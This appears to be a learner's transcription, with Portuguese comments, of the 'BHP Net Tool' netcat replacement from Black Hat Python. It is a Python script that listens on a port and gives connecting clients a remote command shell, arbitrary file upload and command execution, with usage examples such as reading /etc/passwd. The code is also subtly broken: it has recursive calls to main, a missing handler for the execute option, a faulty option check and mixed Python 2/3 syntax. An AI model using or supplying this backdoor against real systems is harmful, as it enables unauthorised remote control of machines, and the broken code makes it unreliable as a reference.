#region BLOCO 1
# imports and globals
# importando bibliotecas necessárias
import sys
import socket
import getopt
import threading
import subprocess

# definindo variaveis globais
listen              = False
command             = False
upload              = False
execute             = ""
target              = ""
upload_destination  = ""
port                = 0
#endregion BLOCO 1

#region BLOCO 2 
# usage method and main method
# helper/ how to use
def usage(): # (1)
    print ("BHP Net Tool")
    print ()
    print ("Usage: bhpnet.py -t target_host -p port")
    print ("-l --listen                 -listen on [host]:[port] for incoming connections")
    print ("e --execute=file_to_run     - execute the given file upon receiving a connection")
    print ("-c --command                - initialize a command shell")
    print ("-u --upload=destination     - upon receiving connection upload a file and write to [destination]")
    print ()
    print ()
    print ("Examples: ")
    print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print ("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135" )
    sys.exit(0)

# principal
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # lê as opções da linha de comando

    try: #(2)
        opts, args = getopt.getopt(
                        sys.argv[1:],
                        "hle:t:p:cu",
                        ["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print (str(err))
        usage()
    
    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-c --commandshell"):
            command = True
        elif o in ("-u","--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"
    
    # iremos ouvir ou simplesmente enviar dados de stdin?
    if not listen and len(target) and port > 0: #(3)
        # lê o buffer da linha de comando
        # causará um bloqueio, portanto envie um ctrl+D
        # se não estiver enviando dados de entrada para stdin
        buffer = sys.stdin.read()

        # send data off
        client_sender(buffer)

    # iremos ouvir a porta e, potencialmente,
    # faremos upload de dados, executaremos comandos e deixaremos um shell
    # de acordo com as opções da linha de comado anteriores

    if listen:
        server_loop() #(4)

    main()

#endregion BLOCO 2

#region BLOCO 3
# client sender

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # conectando-se ao host-alvo
        client.connect((target,port))

        if len(buffer): #(1)
            client.send(buffer)

        while True:
            # esperar receber dados de volta
            recv_len = 1
            response = ""

            while recv_len: #(2)
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
                
                print (response),

                # esperando mais dados de entrada
                buffer = raw_input("") #(3)
                buffer += "\n"
                
                # enviando dados
                client.send(buffer)
    except:
        print ("[*] Exception! Exiting.")
        
        #encerrando conexao
        client.close()
#endregion BLOCO 3

#region BLOCO 4
# server_loop e run_command
def server_loop():
    global target

    # se não houver nenhum alvo definido, ouviremos todas as interfaces
    if not len(target):
        target = "0.0.0.0"
    
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # disparar uma thread para cuidar do novo cliente
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()   

def run_command(command):
    #remove a quebra de linha
    command = command.rstrip()

    #executa o comando e obtém os dados de saída
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True) #(1)
    except:
        output = "Failed to execute command.\r\n"
    
    #enviando dados de saída para o client
    return output
#endregion BLOCO 4

#region BLOCO 5
# client handler
def client_handler(client_socket):
    global upload
    global execute
    global command

    # verifica se é upload
    if len(upload_destination): #(1)

        # lê todos os bytes e grava no destino
        file_buffer = ""

        # permanecer lendo dados até que não haja mais nenhum disponível
        while True: #(2)
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data
        
        # tentar gravar dados
        try: #(3)
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    # verifica se é execução de comando
    if len(execute):

        # executa o comando
        output = run_command(execute)

        client_socket.send(output)
    
    # entra em outro laço se um shell de comandos foi solicitado
    if command: #(4)
        while True:
            # mostra um prompt simples
            client_socket.send("<BHP:#> ")

            # agora ficamos recebendo dados até vermos um linefeed (tecla enter)

            cmd_buffer = ""

            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            
            # envia de volta a saída do comando

            response = run_command(cmd_buffer)

            # envia de volta a resposta
            client_socket.send(response)
#endregion BLOCO 5